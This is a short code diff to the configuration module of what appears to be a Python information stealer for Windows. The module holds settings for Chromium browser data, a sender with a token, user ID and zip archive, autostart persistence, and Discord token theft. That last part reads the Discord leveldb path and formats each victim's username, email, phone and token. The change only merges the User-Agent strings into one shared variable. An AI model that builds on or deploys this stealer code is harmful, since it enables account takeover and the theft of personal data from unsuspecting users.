@@ -6,6 +6,7 @@ from win32api import GetUserName
 
 user_profile = environ["USERPROFILE"]
 user = GetUserName()
+user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
 
 
 class ChromiumConfig:
@@ -74,7 +75,7 @@ class SystemConfig:
 class SenderConfig:
 
     Variables = ("zip_name", "storage_path", "token", "user_id", "errors")
-    UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    UserAgent = user_agent
 
 
 class AutostartConfig:
@@ -89,7 +90,7 @@ class DiscordConfig:
 
     TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
     Variables = ("storage_path", "folder", "statuses", "errors")
-    UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+    UserAgent = user_agent
     DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"
 
 
